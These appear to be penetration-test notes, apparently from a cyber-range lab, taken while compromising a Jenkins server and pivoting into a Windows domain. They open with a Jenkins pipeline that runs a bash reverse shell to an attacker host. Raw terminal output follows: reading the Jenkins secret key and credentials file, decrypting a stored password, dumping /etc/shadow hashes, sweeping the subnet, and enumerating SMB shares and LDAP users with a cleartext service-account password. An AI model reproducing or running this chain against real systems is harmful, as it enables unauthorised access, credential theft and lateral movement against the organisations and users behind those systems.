



```
pipeline {
    agent any

    stages {
        stage('List') {
            steps {
                 sh '''#!/bin/bash
                         bash -i >& /dev/tcp/10.8.0.3/9999 0>&1
                 '''
            }
        }
    }
}

```


```python
jenkins@jenkins:~$ ls -la
ls -la
total 156
drwxr-xr-x 14 jenkins jenkins  4096 Mar  3 20:35 .
drwxr-xr-x 24 root    root     4096 Mar  3 00:06 ..
-rw-------  1 jenkins jenkins    13 Mar  3 19:58 .bash_history
drwxr-xr-x  3 jenkins jenkins  4096 Mar  3 00:06 .cache
drwxr-xr-x  3 jenkins jenkins  4096 Mar  3 17:39 caches
-rw-r--r--  1 jenkins jenkins  2176 Mar  3 01:06 config.xml
-rw-r--r--  1 jenkins jenkins  1195 Mar  2 23:51 credentials.xml
drwxr-xr-x  3 jenkins jenkins  4096 Mar  3 00:06 .groovy
-rw-r--r--  1 jenkins jenkins   156 Mar  3 01:06 hudson.model.UpdateCenter.xml
-rw-r--r--  1 jenkins jenkins  1267 Mar  2 23:51 hudson.plugins.emailext.ExtendedEmailPublisher.xml
-rw-r--r--  1 jenkins jenkins   370 Mar  2 23:51 hudson.plugins.git.GitTool.xml
-rw-r--r--  1 jenkins jenkins  1680 Mar  2 23:51 identity.key.enc
drwxr-xr-x  3 jenkins jenkins  4096 Mar  2 23:51 .java
-rw-r--r--  1 jenkins jenkins     7 Mar  3 01:06 jenkins.install.InstallUtil.lastExecVersion
-rw-r--r--  1 jenkins jenkins     5 Mar  2 23:51 jenkins.install.UpgradeWizard.state
-rw-r--r--  1 jenkins jenkins   183 Mar  2 23:51 jenkins.model.JenkinsLocationConfiguration.xml
-rw-r--r--  1 jenkins jenkins   240 Mar  2 23:51 jenkins.plugins.git.GitHooksConfiguration.xml
-rw-r--r--  1 jenkins jenkins   357 Mar  2 23:51 jenkins.security.apitoken.ApiTokenPropertyConfiguration.xml
-rw-r--r--  1 jenkins jenkins   169 Mar  2 23:51 jenkins.security.QueueItemAuthenticatorConfiguration.xml
-rw-r--r--  1 jenkins jenkins   162 Mar  2 23:51 jenkins.security.UpdateSiteWarningsConfiguration.xml
-rw-r--r--  1 jenkins jenkins   171 Mar  2 23:51 jenkins.telemetry.Correlator.xml
drwxr-xr-x  3 jenkins jenkins  4096 Mar  2 23:51 jobs
-rw-r--r--  1 jenkins jenkins     0 Mar  3 01:06 .lastStarted
drwxr-xr-x  3 jenkins jenkins  4096 Mar  2 23:51 logs
-rw-r--r--  1 jenkins jenkins  1037 Mar  3 01:06 nodeMonitors.xml
-rw-r--r--  1 jenkins jenkins   325 Mar  2 23:51 org.jenkinsci.plugins.gitclient.GitHostKeyVerificationConfiguration.xml
-rw-r--r--  1 jenkins jenkins   173 Mar  3 20:34 org.jenkinsci.plugins.workflow.flow.FlowExecutionList.xml
-rw-r--r--  1 jenkins jenkins     3 Mar  3 19:56 .owner
drwxr-xr-x 90 jenkins jenkins 12288 Mar  3 00:06 plugins
-rw-r--r--  1 jenkins jenkins   259 Mar  3 20:35 queue.xml
-rw-r--r--  1 jenkins jenkins   259 Mar  3 01:05 queue.xml.bak
-rw-r--r--  1 jenkins jenkins  1270 Mar  3 20:15 scriptApproval.xml
-rw-r--r--  1 jenkins jenkins    64 Mar  2 23:51 secret.key
-rw-r--r--  1 jenkins jenkins     0 Mar  2 23:51 secret.key.not-so-secret
drwxr-xr-x  2 jenkins jenkins  4096 Mar  3 17:43 secrets
drwxr-xr-x  2 jenkins jenkins  4096 Mar  3 00:06 updates
drwxr-xr-x  2 jenkins jenkins  4096 Mar  3 00:03 userContent
drwxr-xr-x  4 jenkins jenkins  4096 Mar  3 00:03 users
drwxr-xr-x  3 jenkins jenkins  4096 Mar  3 17:39 workspace
jenkins@jenkins:~$ cat secret.key
cat secret.key
19a97b95c4116baa80ad910eedd4510980b95a01ee42046365cd30388c8bed8d
```



```python
cat credentials.xml
<?xml version='1.1' encoding='UTF-8'?>
<com.cloudbees.plugins.credentials.SystemCredentialsProvider plugin="credentials@1405.vb_cda_74a_f8974">
  <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash">
    <entry>
      <com.cloudbees.plugins.credentials.domains.Domain>
        <specifications/>
      </com.cloudbees.plugins.credentials.domains.Domain>
      <java.util.concurrent.CopyOnWriteArrayList/>
    </entry>
    <entry>
      <com.cloudbees.plugins.credentials.domains.Domain>
        <name>private</name>
        <specifications/>
      </com.cloudbees.plugins.credentials.domains.Domain>
      <list>
        <com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
          <scope>SYSTEM</scope>
          <id>1</id>
          <description>user130</description>
          <username>user130</username>
          <password>{AQAAABAAAAAgVPSpCS9XYnlGrSCZWm76ofPTHG/1d8wX8nfDmAPqVEegRUb+yVCRYjeALFLBI7rN}</password>
          <usernameSecret>false</usernameSecret>
        </com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
      </list>
    </entry>
  </domainCredentialsMap>
```


```PYTHON
jenkins@jenkins:~$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
debian:x:1000:1000:debian,,,:/home/debian:/bin/bash
user130:x:1001:1001::/home/user130:/bin/sh
jenkins:x:102:109:Jenkins,,,:/var/lib/jenkins:/bin/bash
web_svc:x:1002:1002::/home/web_svc:/bin/sh
app_svc:x:1003:1003::/home/app_svc:/bin/sh
ntp_svc:x:1004:1004::/home/ntp_svc:/bin/sh
test_svc:x:1005:1005::/home/test_svc:/bin/sh
service_svc:x:1006:1006::/home/service_svc:/bin/sh
mail_svc:x:1007:1007::/home/mail_svc:/bin/sh
syslog_svc:x:1008:1008::/home/syslog_svc:/bin/sh
vpn_svc:x:1009:1009::/home/vpn_svc:/bin/sh
proxy_svc:x:1010:1010::/home/proxy_svc:/bin/sh
dns_svc:x:1011:1011::/home/dns_svc:/bin/sh
```


```
jenkins@jenkins:~/.ssh$ ssh-keygen
ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/var/lib/jenkins/.ssh/id_rsa): lol
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in lol
Your public key has been saved in lol.pub
The key fingerprint is:
SHA256:smUCKzQG7Bm476dWfLR2prtndBMUBIywkJFtH6Y6Mo0 jenkins@jenkins
The key's randomart image is:
+---[RSA 3072]----+
|+ o=.. o.oo.     |
|.+o.o.+ . .      |
|..*.o+ . .       |
|.= ..oo   .      |
| +.o..o.S  .     |
|E =.o +*+ o      |
| + o o.= . .     |
|  o . . o        |
| ..o  o=         |
+----[SHA256]-----+
```


public key

```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBKpfKmte0Jti5BBv1QuEa1k8d6uJsf05E9Up0cPj/p+k3m7GZAAy2Zxqsz11Vz7KESpQlGE/4VopNgXUKkM5F7VmwJ2HMwjUmY0ZLtF3iCla+EY41ql/N6spdImhtqelXMoElV8tQkpodBingNhPSrWh94ES5m9WVE1ep/7Ux65ypj53ku3Td3tVq8KvBsx7HnxDt56heTpzsITP4acOos+nlMljFE5UVPgCf8ZeuqyfMsBHY5PWyEg1GWnk+rBKXk6HQExKSiyEUKxbUZoEJEpKzD+ZpQBSeaM+p9be0fFrja9PCFa0eyvpPQ59FAvmnFFZO5NGQIk0yrUR1EvZnj5bjxSu1R6pHHRLuFFpNTQKrkjJf0QZfxUYk17qGz1eccQ1uxL0dAPzZFpqff8JXItWxpnhrpUSEWJBoajRmGdWoeyp02ljlWOIzCOAIEowhtELj82EtKGi5Nqs2Bf0vE776oA4gYBgTJ6fgp2iPdzJ5tX7gosJky+6N+8ug+yU= jenkins@jenkins
```


![[Cyber Range-20250303164404136.webp]]


```python
jenkins@jenkins:~$ netstat -tunlp
netstat -tunlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::8080                 :::*                    LISTEN      476/java
udp        0      0 0.0.0.0:57951           0.0.0.0:*                           -
```




https://stackoverflow.com/questions/37683143/extract-passphrase-from-jenkins-credentials-xml



```python
jenkins@jenkins:~$ ./jenkins-credentials-decryptor_1.2.2_Linux_x86_64 -m /var/lib/jenkins/secrets/master.key -s /var/lib/jenkins/secrets/hudson.util.Secret -c credentials.xml                                                               
[                                                                                                                                                                                                                                            
  {                                                                                                                                                                                                                                          
    "description": "user130",                                                                                                                                                                                                                
    "id": "1",                                                                                                                                                                                                                               
    "password": "tOes3875nB3mx25gRTjvICy",                                                                                                                                                                                                   
    "scope": "SYSTEM",                                                                                                                                                                                                                       
    "username": "user130"                                                                                                                                                                                                                    
  }                                                                                                                                                                                                                                          
]                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                             
jenkins@jenkins:~$ su user130

```




```
bash-5.2# cat /etc/shadow
root:$y$j9T$oZZzpKdkK40MQBSByF1sS1$xjTwL79XyZ6lS5b/GPswBPXC8NfD8BVWeKcAkNCmJT8:20085:0:99999:7:::
daemon:*:20085:0:99999:7:::
bin:*:20085:0:99999:7:::
sys:*:20085:0:99999:7:::
sync:*:20085:0:99999:7:::
games:*:20085:0:99999:7:::
man:*:20085:0:99999:7:::
lp:*:20085:0:99999:7:::
mail:*:20085:0:99999:7:::
news:*:20085:0:99999:7:::
uucp:*:20085:0:99999:7:::
proxy:*:20085:0:99999:7:::
www-data:*:20085:0:99999:7:::
backup:*:20085:0:99999:7:::
list:*:20085:0:99999:7:::
irc:*:20085:0:99999:7:::
_apt:*:20085:0:99999:7:::
nobody:*:20085:0:99999:7:::
systemd-network:!*:20085::::::
messagebus:!:20085::::::
sshd:!:20085::::::
debian:$y$j9T$T0XEBsTtnm8qpZmRMHUgj.$d374pl4ioP10JrDNPNcoXVgZxGtQ7MXPlwU9InJDEM1:20149:0:99999:7:::
user130:$y$j9T$F4DyfZiCM9SIWFLzeLCp..$zGPm50Nkz3aIaqLb6Fo5RNdkJC04EVjRKbueqIYOMN7:20149:0:99999:7:::
jenkins:!:20149::::::
web_svc:$y$j9T$TEfn/AwWudMhnHLhHgkMo1$z8Q2NS20.U4lZUl9rfUWuxDBMNEoKkBNBgn3g3FwHe2:20149:0:99999:7:::
app_svc:$y$j9T$eQrIoMVheRPIc/P5Kvaig.$PaqcTgQ.i5VVkQw459N4fhomF01C8M17vM76xb/Bd41:20149:0:99999:7:::
ntp_svc:$y$j9T$8UAamqoIAV7P5qYDmHT4k.$KaQCCyZ4bDak/X8DkWmPMYxPo/rtk3WJ5eHBCpaA4R5:20149:0:99999:7:::
test_svc:$y$j9T$SUP280AGVgGEdeNh2FWqG1$g9gI.x8WoUETRzdnwCXl95tA.gaJwV7WcJFNX1mEe//:20149:0:99999:7:::
service_svc:$y$j9T$Avzpsf4yeFBqDJDa4VDNl0$fqdec7ARKIC8Uxr9O.VoB6y8cqUiplTnS72plbcAzC4:20149:0:99999:7:::
mail_svc:$y$j9T$ZrsIuYFlx6kzDctv6WEhW0$9lS6DSLFIJM4VSC2oJf03xoTBGS5LQpt5yULvN4jrAC:20149:0:99999:7:::
syslog_svc:$y$j9T$iXtff7XWDBCGyI.q0ubkf0$bZdOZrTKirulc6BZcYpOGeQwvKAWojutY3Pu.ZUpZn3:20149:0:99999:7:::
vpn_svc:$y$j9T$gXdeqQXqq/qtLKr3RTjFh.$winfxRRpg65mOkpTmUqkD.ZNOabtvn1/XaOzxOYjmn7:20149:0:99999:7:::
proxy_svc:$y$j9T$sSYpcZhw6iBcCo8Euv3iD0$py.ckZayJQob8EwWuxrwQgFgm1NXpzwYAPV96VGITMC:20149:0:99999:7:::
dns_svc:$y$j9T$KXP6Ue2Guakgo47ljB/Xs.$1QcKdW/bUQdjaHFRRg5t6lWOlmJMtbW14W/wKWu4AX0:20149:0:99999:7:::

```



```python
root@jenkins:~# arp -a
? (10.2.30.254) at bc:24:11:06:97:9a [ether] on ens18
root@jenkins:~# ifconfig
ens18: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.2.30.1  netmask 255.255.255.0  broadcast 10.2.30.255
        inet6 fe80::be24:11ff:feac:416a  prefixlen 64  scopeid 0x20<link>
        ether bc:24:11:ac:41:6a  txqueuelen 1000  (Ethernet)
        RX packets 55484  bytes 15586118 (14.8 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 63794  bytes 15951985 (15.2 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens19: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::be24:11ff:fe26:5cd0  prefixlen 64  scopeid 0x20<link>
        ether bc:24:11:26:5c:d0  txqueuelen 1000  (Ethernet)
        RX packets 966759  bytes 206258180 (196.7 MiB)
        RX errors 0  dropped 51272  overruns 0  frame 0
        TX packets 42  bytes 3036 (2.9 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 1557  bytes 145188 (141.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1557  bytes 145188 (141.7 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.8.0.4  netmask 255.255.255.0  destination 10.8.0.4
        inet6 fe80::210a:9c5f:cac2:737e  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 24488  bytes 6884921 (6.5 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 41891  bytes 11448811 (10.9 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


```


```
root@jenkins:~# for i in {1..254} ;do (ping -c 1 10.2.10.$i | grep "bytes from" &) ;done
64 bytes from 10.2.10.2: icmp_seq=1 ttl=63 time=0.904 ms   <---------------------- out of scope
64 bytes from 10.2.10.11: icmp_seq=1 ttl=127 time=1.02 ms
64 bytes from 10.2.10.12: icmp_seq=1 ttl=127 time=1.32 ms
64 bytes from 10.2.10.13: icmp_seq=1 ttl=127 time=0.814 ms
64 bytes from 10.2.10.14: icmp_seq=1 ttl=127 time=0.996 ms
64 bytes from 10.2.10.15: icmp_seq=1 ttl=127 time=0.956 ms
64 bytes from 10.2.10.254: icmp_seq=1 ttl=64 time=0.210 ms  <---------------------- out of scope
```




smb share enumeration + anonymous (recheck anonymous)

```python
kali@kali ~> nxc smb 10.2.10.0/24
SMB         10.2.10.11      445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:red.local) (signing:True) (SMBv1:False)
SMB         10.2.10.14      445    HR-PC-413        [*] Windows 11 Build 22621 x64 (name:HR-PC-413) (domain:red.local) (signing:False) (SMBv1:False)
SMB         10.2.10.15      445    IT-INTERN-19     [*] Windows 11 Build 22621 x64 (name:IT-INTERN-19) (domain:red.local) (signing:False) (SMBv1:False)
SMB         10.2.10.12      445    MAILSRV-2        [*] Windows Server 2022 Build 20348 (name:MAILSRV-2) (domain:red.local) (signing:False) (SMBv1:False)
SMB         10.2.10.13      445    DBSRV-2          [*] Windows Server 2022 Build 20348 (name:DBSRV-2) (domain:red.local) (signing:False) (SMBv1:False)
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
kali@kali ~> nxc smb 10.2.10.12 -u '' -p ''
SMB         10.2.10.12      445    MAILSRV-2        [*] Windows Server 2022 Build 20348 (name:MAILSRV-2) (domain:red.local) (signing:False) (SMBv1:False)
SMB         10.2.10.12      445    MAILSRV-2        [-] red.local\: STATUS_ACCESS_DENIED 
kali@kali ~> nxc smb 10.2.10.13 -u '' -p ''
SMB         10.2.10.13      445    DBSRV-2          [*] Windows Server 2022 Build 20348 (name:DBSRV-2) (domain:red.local) (signing:False) (SMBv1:False)
SMB         10.2.10.13      445    DBSRV-2          [-] red.local\: STATUS_ACCESS_DENIED 
kali@kali ~> nxc smb 10.2.10.14 -u '' -p ''
SMB         10.2.10.14      445    HR-PC-413        [*] Windows 11 Build 22621 x64 (name:HR-PC-413) (domain:red.local) (signing:False) (SMBv1:False)
SMB         10.2.10.14      445    HR-PC-413        [-] red.local\: STATUS_ACCESS_DENIED 
kali@kali ~> nxc smb 10.2.10.15 -u '' -p ''
SMB         10.2.10.15      445    IT-INTERN-19     [*] Windows 11 Build 22621 x64 (name:IT-INTERN-19) (domain:red.local) (signing:False) (SMBv1:False)
SMB         10.2.10.15      445    IT-INTERN-19     [-] red.local\: STATUS_ACCESS_DENIED 
kali@kali ~> nxc smb 10.2.10.11 -u '' -p ''
SMB         10.2.10.11      445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:red.local) (signing:True) (SMBv1:False)
SMB         10.2.10.11      445    DC               [+] red.local\: 
```





```python
kali@kali ~> proxychains -q nxc ldap 10.2.10.11 -u 'web_svc' -p '123-ilovejess' --users
LDAP        10.2.10.11      389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:red.local)
LDAP        10.2.10.11      389    DC               [+] red.local\web_svc:123-ilovejess 
LDAP        10.2.10.11      389    DC               [*] Enumerated 101 domain users: red.local
LDAP        10.2.10.11      389    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                                               
LDAP        10.2.10.11      389    DC               Administrator                 2024-12-29 03:54:42 0       Built-in account for administering the computer/domain      
LDAP        10.2.10.11      389    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain    
LDAP        10.2.10.11      389    DC               krbtgt                        2025-03-02 15:19:22 0       Key Distribution Center Service Account                     
LDAP        10.2.10.11      389    DC               User                          2025-03-02 15:24:41 1                                                                   
LDAP        10.2.10.11      389    DC               Admin                         2025-03-02 15:24:45 0                                                                   
LDAP        10.2.10.11      389    DC               web_svc                       2025-03-02 16:09:25 6                                                                   
LDAP        10.2.10.11      389    DC               HR_2205185                    2025-03-02 16:09:28 0                                                                   
LDAP        10.2.10.11      389    DC               SvcAccountMgr                 2025-03-02 16:09:31 0                                                                   
LDAP        10.2.10.11      389    DC               Svc_Sql_Backup                2025-03-02 16:09:34 0                                                                   
LDAP        10.2.10.11      389    DC               MgmtAdmin                     2025-03-02 16:09:38 0                                                                   
LDAP        10.2.10.11      389    DC               HR_5643498                    2025-03-02 16:10:04 0                                                                   
LDAP        10.2.10.11      389    DC               HR_7214606                    2025-03-02 16:10:16 0                                                                   
LDAP        10.2.10.11      389    DC               HR_9051466                    2025-03-02 16:10:21 0                                                                   
LDAP        10.2.10.11      389    DC               HR_3434661                    2025-03-02 16:10:25 0                                                                   
LDAP        10.2.10.11      389    DC               HR_4470077                    2025-03-02 16:10:29 0                                                                   
LDAP        10.2.10.11      389    DC               HR_8601287                    2025-03-02 16:10:33 0                                                                   
LDAP        10.2.10.11      389    DC               HR_7190544                    2025-03-02 16:10:38 0                                                                   
LDAP        10.2.10.11      389    DC               HR_8180309                    2025-03-02 16:10:42 0                                                                   
LDAP        10.2.10.11      389    DC               HR_3865630                    2025-03-02 16:10:46 0                                                                   
LDAP        10.2.10.11      389    DC               HR_9169012                    2025-03-02 16:10:50 0                                                                   
LDAP        10.2.10.11      389    DC               HR_3663307                    2025-03-02 16:10:54 0                                                                   
LDAP        10.2.10.11      389    DC               HR_6208840                    2025-03-02 16:10:59 0                                                                   
LDAP        10.2.10.11      389    DC               HR_1243374                    2025-03-02 16:11:03 0                                                                   
LDAP        10.2.10.11      389    DC               HR_2829296                    2025-03-02 16:11:07 0                                                                   
LDAP        10.2.10.11      389    DC               HR_4893054                    2025-03-02 16:11:11 0                                                                   
LDAP        10.2.10.11      389    DC               HR_2554350                    2025-03-02 16:11:15 0                                                                   
LDAP        10.2.10.11      389    DC               HR_8408580                    2025-03-02 16:11:20 0                                                                   
LDAP        10.2.10.11      389    DC               HR_9512732                    2025-03-02 16:11:24 0                                                                   
LDAP        10.2.10.11      389    DC               HR_9200622                    2025-03-02 16:11:28 0                                                                   
LDAP        10.2.10.11      389    DC               HR_6108731                    2025-03-02 16:11:32 0                                                                   
LDAP        10.2.10.11      389    DC               HR_7456727                    2025-03-02 16:11:37 0                                                                   
LDAP        10.2.10.11      389    DC               HR_9595173                    2025-03-02 16:11:41 0                                                                   
LDAP        10.2.10.11      389    DC               HR_9802692                    2025-03-02 16:11:45 0                                                                   
LDAP        10.2.10.11      389    DC               HR_8899624                    2025-03-02 16:11:49 0                                                                   
LDAP        10.2.10.11      389    DC               HR_8733779                    2025-03-02 16:11:53 0                                                                   
LDAP        10.2.10.11      389    DC               HR_5416740                    2025-03-02 16:11:58 0                                                                   
LDAP        10.2.10.11      389    DC               HR_1577307                    2025-03-02 16:12:02 0                                                                   
LDAP        10.2.10.11      389    DC               HR_8665293                    2025-03-02 16:12:06 0                                                                   
LDAP        10.2.10.11      389    DC               HR_8313753                    2025-03-02 16:12:10 0                                                                   
LDAP        10.2.10.11      389    DC               HR_7786344                    2025-03-02 16:12:15 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Staff-4439347              2025-03-02 16:12:19 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Staff-6089241              2025-03-02 16:12:23 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Staff-9276620              2025-03-02 16:12:28 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Staff-8376703              2025-03-02 16:12:32 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Staff-9624860              2025-03-02 16:12:36 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Staff-2825418              2025-03-02 16:12:41 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Staff-2125632              2025-03-02 16:12:45 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Staff-2228692              2025-03-02 16:12:49 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Staff-4489759              2025-03-02 16:12:53 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Staff-1652943              2025-03-02 16:12:57 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Staff-5133776              2025-03-02 16:13:02 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Staff-3328100              2025-03-02 16:13:06 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Staff-4281238              2025-03-02 16:13:10 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Staff-7697657              2025-03-02 16:13:14 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Staff-2493388              2025-03-02 16:13:18 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Staff-3033571              2025-03-02 16:13:23 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Staff-2822772              2025-03-02 16:13:27 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Staff-7209403              2025-03-02 16:13:31 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Staff-4552946              2025-03-02 16:13:35 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Staff-8668359              2025-03-02 16:13:40 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Staff-4992042              2025-03-02 16:13:44 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Staff-4813962              2025-03-02 16:13:48 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Staff-4779396              2025-03-02 16:13:52 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Staff-3382479              2025-03-02 16:13:56 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Staff-5247324              2025-03-02 16:14:00 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Staff-6305098              2025-03-02 16:14:05 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Staff-7278867              2025-03-02 16:14:09 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Staff-8639869              2025-03-02 16:14:13 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Staff-4418650              2025-03-02 16:14:17 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Staff-4037526              2025-03-02 16:14:21 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Intern-4617415             2025-03-02 16:14:25 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Intern-8921449             2025-03-02 16:14:30 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Intern-2535810             2025-03-02 16:14:34 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Intern-8873554             2025-03-02 16:14:38 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Intern-8722738             2025-03-02 16:14:42 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Intern-4796332             2025-03-02 16:14:46 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Intern-6366214             2025-03-02 16:14:51 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Intern-2155716             2025-03-02 16:14:55 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Intern-8413705             2025-03-02 16:14:59 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Intern-2913037             2025-03-02 16:15:03 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Intern-9862001             2025-03-02 16:15:07 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Intern-6759165             2025-03-02 16:15:14 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Intern-6405969             2025-03-02 16:15:18 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Intern-9566828             2025-03-02 16:15:22 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Intern-9655018             2025-03-02 16:15:26 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Intern-6421024             2025-03-02 16:15:31 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Intern-5104941             2025-03-02 16:15:35 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Intern-9600737             2025-03-02 16:15:39 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Intern-4024153             2025-03-02 16:15:44 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Intern-7185486             2025-03-02 16:15:48 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Intern-3038246             2025-03-02 16:15:52 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Intern-2300770             2025-03-02 16:15:56 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Intern-1690645             2025-03-02 16:16:01 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Intern-6335921             2025-03-02 16:16:05 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Intern-5104078             2025-03-02 16:16:09 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Intern-2609468             2025-03-02 16:16:14 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Intern-7920541             2025-03-02 16:16:18 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Intern-6313987             2025-03-02 16:16:22 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Intern-7935264             2025-03-02 16:16:26 0                                                                   
LDAP        10.2.10.11      389    DC               IT-Intern-4514125             2025-03-02 16:16:30 0                                                                   
LDAP        10.2.10.11      389    DC               HR_2614616                    <never>             0       Remind to change his password from the default TempPass123! 

```



```python
kali@kali ~> proxychains -q nxc smb 10.2.10.0/24 -u 'web_svc' -p '123-ilovejess' --shares
SMB         10.2.10.11      445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:red.local) (signing:True) (SMBv1:False)
SMB         10.2.10.14      445    HR-PC-413        [*] Windows 11 Build 22621 x64 (name:HR-PC-413) (domain:red.local) (signing:False) (SMBv1:False)
SMB         10.2.10.15      445    IT-INTERN-19     [*] Windows 11 Build 22621 x64 (name:IT-INTERN-19) (domain:red.local) (signing:False) (SMBv1:False)
SMB         10.2.10.11      445    DC               [+] red.local\web_svc:123-ilovejess 
SMB         10.2.10.14      445    HR-PC-413        [+] red.local\web_svc:123-ilovejess 
SMB         10.2.10.15      445    IT-INTERN-19     [+] red.local\web_svc:123-ilovejess 
SMB         10.2.10.12      445    MAILSRV-2        [*] Windows Server 2022 Build 20348 (name:MAILSRV-2) (domain:red.local) (signing:False) (SMBv1:False)
SMB         10.2.10.13      445    DBSRV-2          [*] Windows Server 2022 Build 20348 (name:DBSRV-2) (domain:red.local) (signing:False) (SMBv1:False)
SMB         10.2.10.14      445    HR-PC-413        [*] Enumerated shares
SMB         10.2.10.14      445    HR-PC-413        Share           Permissions     Remark
